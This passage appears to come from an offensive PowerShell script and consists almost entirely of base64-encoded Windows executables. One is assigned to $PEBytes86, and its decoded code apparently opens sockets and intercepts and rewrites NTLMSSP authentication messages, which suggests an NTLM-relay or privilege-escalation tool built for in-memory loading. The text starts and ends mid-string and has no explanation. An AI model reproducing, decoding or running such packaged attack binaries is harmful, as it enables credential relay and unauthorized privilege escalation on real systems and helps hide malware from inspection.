IA0EgAACJJAAComwIANEkAAI9JAADMnAIAkEkAAMxJAADMnAIAzEkAAAhKAADMnAIACEoAAKlLAAAcnwIAwEsAAB5MAAA8nwIAdEwAALBMAADEnAIAsEwAAPdMAADYnAIA+EwAADRNAADEnAIANE0AAFdNAADgmwIAZE0AALVNAAAkoAIAuE0AAAlOAAD4nwIADE4AAF9OAABcnwIAYE4AAIJPAABEnwIAhE8AAK5PAADEnAIAuE8AABxQAABcnwIAHFAAAE5QAAComwIAUFAAABlRAABsnwIAQFEAAH9SAACYnwIAgFIAAOZTAAC0nwIA6FMAAOtUAACEnwIA7FQAAAtWAACEnwIAzFcAAAZYAADEnAIACFgAAFtYAADMnAIAXFgAAG5YAAComwIAcFgAAIJYAAComwIAhFgAAJxYAADEnAIAnFgAALRYAADEnAIAtFgAADpZAADQnwIAPFkAAPtZAADknwIA/FkAAGlaAABEoAIAcFoAAJ9aAADEnAIAxFoAACpbAADMnAIALFsAAD5bAAComwIAQFsAAFJbAAComwIAVFsAAOFbAABwoAIA5FsAAAlcAADEnAIADFwAABdeAACYnwIAGF4AALheAACEoAIAuF4AAOBeAAComwIA4F4AAPleAAComwIAQF8AAFBfAACYoAIAYF8AAPBgAACkoAIA8GAAAA9hAAComwIAEGEAAClhAAComwIALGEAAOthAABcnwIA7GEAADNiAAComwIANGIAAFZiAAComwIAWGIAAH9iAAComwIAgGIAAKliAADEnAIAuGIAAPNiAADMnAIABGMAAGpjAADEnAIAbGMAAFNkAACooAIAVGQAAFJmAACQogIAVGYAAFVoAADQogIAWGgAABhpAAAQowIAGGkAANlpAAA8owIA3GkAAK1qAACoowIAsGoAAIFrAACoowIAhGsAAElwAABoowIATHAAAEd1AACIowIASHUAAF13AADAowIAYHcAAE96AADcowIAUHoAAI17AAB4ogIAkHsAANJ8AAB4ogIA1HwAAAt/AABIogIADH8AAKCBAABgogIAoIEAABqCAADEnAIA9IIAADCDAADEnAIAUIMAADqFAABEoQIAPIUAAIyHAADQoQIAFIkAAJuJAADEnAIAnIkAAMyJAADMnAIAzIkAAFaLAADkoAIAWIsAAD6OAACAoQ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im8Kb4pmCnaKdwp3ingKeIp5CnmKegp6insKe4p8CnyKfQp9in4Kfop/Cn+KcAqAioEKgYqCCoKKgwqDioQKhIqFCoWKhgqGiocKh4qICoiKiQqJiooKioqLCowKjIqNCo2KjgqOio8Kj4qACpCKkQqRipIKkoqTCpOKlAqUipUKlYqWCpaKlwqXipgKmIqZCpmKmgqaipsKm4qcCpyKnQqdip4KnoqfCp+KkAqgiqEKoYqgAAABACAEgBAADopfCl+KUAplimaKZ4poimmKaoprimyKbYpuim+KYIpxinKKc4p0inWKdop3iniKeYp6inuKfIp9in6Kf4pwioGKgoqDioSKhYqGioeKiIqJioqKi4qMio2KjoqPioCKkYqSipOKlIqVipaKl4qYipmKmoqbipyKnYqeip+KkIqhiqKKo4qkiqWKpoqniqiKqYqqiquKrIqtiq6Kr4qgirGKsoqzirSKtYq2ireKuIq5irqKu4q8ir2Kvoq/irCKwYrCisOKxIrFisaKx4rIismKyorLisyKzYrOis+KwIrRitKK04rUitWK1orXitiK2YraituK3Irdit6K34rQiuGK4orjiuSK5YrmiueK6IrpiuqK64rsiu2K7orviuCK8YryivOK9Ir1ivaK94r4ivmK+or7ivyK/Yr+iv+K8AAAAgAgCcAAAACKAYoCigOKBIoFigaKB4oIigmKCooLigyKDYoOig+KAIoRihKKE4oUihWKFooXihiKGYoaihuKHIodih6KH4oQiiGKIoojiiSKJYomiieKKIopiiqKK4osii2KLooviiCKMYoyijOKNIo1ijaKN4o4ijmKOoo7ijyKPYo+ij+KMIpBikKKQ4pEikWKRopHikiKQAAAAwAgDQAQAAsKDAoNCg4KDwoAChEKEgoTChQKFQoWChcKGAoZChoKGwocCh0KHgofChAKIQoiCiMKJAolCiYKJwooCikKKgorCiwKLQouCi8KIAoxCjIKMwo0CjUKNgo3CjgKOQo6CjsKPAo9Cj4KPwowCkEKQgpDCkQKRQpGCkcKSApJCkoKSwpMCk0KTgpPCkAKUQpSClMKVApVClYKVwpYClkKWgpbClwKXQpeCl8KUAphCmIKYwpkCmUKZgpnCmgKaQpqCmsKbAptCm4KbwpgCnEKcgpzCnQKdQp2CncKeAp5CnoKewp8Cn0Kfgp/CnAKgQqCCoMKhAqFCoYKhwqICokKigqLCowKjQqOCo8KgAqRCpIKkwqUCpUKlgqXCpgKmQqaCpsKnAqdCp4KnwqQCqEKogqjCqQKpQqmCqcKqAqpCqoKqwqsCq0KrgqvCqAKsQqyCrMKtAq1CrYKtwq4CrkKugq7CrwKvQq+Cr8KsArBCsIKwwrECsUKxgrHCsgKyQrKCssKzArNCs4KzwrACtEK0grTCtQK1QrWCtcK2ArZCtoK2wrcCt0K3grfCtAK4QriCuMK5ArlCuYK5wroCukK6grrCuwK7QruCuAHACAEQAAADQo9ij4KPoo/Cj+KMApAikEKQYpCCkKKQwpDikQKRIpFCkWKRgpGikcKR4pICkiKSQpJikoKSopLCkAAAAgAIA6AAAANig4KDooPCg+KAAoQihKKE4oXChgKGQoaCh0KHgofChAKIQoiCiMKJAonCigKKQoqCisKLAotCi4KLwoviiAKMwo3ijkKOgo7Cj0KPgo+ij8KP4owCkCKQQpKikuKTApMik0KTYpOCk6KTwpPikAKUIpRClGKVApVileKWApYilkKXIpdilAKYIphCmGKYopjimWKZoppCmwKbQpnCogKiQqKCosKjAqNCo8Kj4qACpCKkQqRipMKlwqZCpqKnIqeCp6KnwqfipAKoIqhCqeK6QrpiuIK84r0CvSK9QrwAAAMACAGgAAACwofihGKI4oliieKKoosCiyKLQogijEKMgo3CoeKiAqIiokKiYqKCoqKiwqLioyKjQqNio4KjoqPCo+KgAqUCqUKpoqpCquKrgqgirMKtgq4CroKvAq+irCKw4rHCsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=='

$PEBytes86 = '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